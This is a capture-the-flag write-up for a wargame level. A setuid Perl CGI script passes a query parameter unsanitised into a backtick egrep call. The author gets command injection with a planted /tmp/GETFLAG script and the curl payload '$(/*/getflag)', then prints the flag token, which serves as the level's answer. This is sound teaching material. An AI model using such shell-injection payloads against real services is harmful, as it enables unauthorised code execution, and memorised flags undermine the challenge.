## writeup level12

When logging in as user leve12, we see a perl file:
```shell
$ ls -l level12.pl
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl

$ cat ./level12.pl
```
```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```
We also see the script is running on port `4646`:
```shell
$ netstat -tulpn | grep 4646
tcp6       0      0 :::4646                 :::*                    LISTEN      -
```
So by quickly analyzing this perl script, we see that we can pass in an `x` parameter which will be uppercased and every space/newline and everything after it will be removed. \
Then it will be used inside the shell execution `egrep "^OUR_PARAM" /tmp/xd 2>&1`. We might want to execute `getflag` somehow: \
So we will need to create a script in uppercase in /tmp, and with the help of a subshell and globbing we will be able to execute it:
```shell
$ cat > /tmp/GETFLAG <<EOF
#!/bin/sh
getflag > /tmp/flag
EOF

$ chmod +x /tmp/GETFLAG

$ curl localhost:4646?x='$(/*/getflag)'

..$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr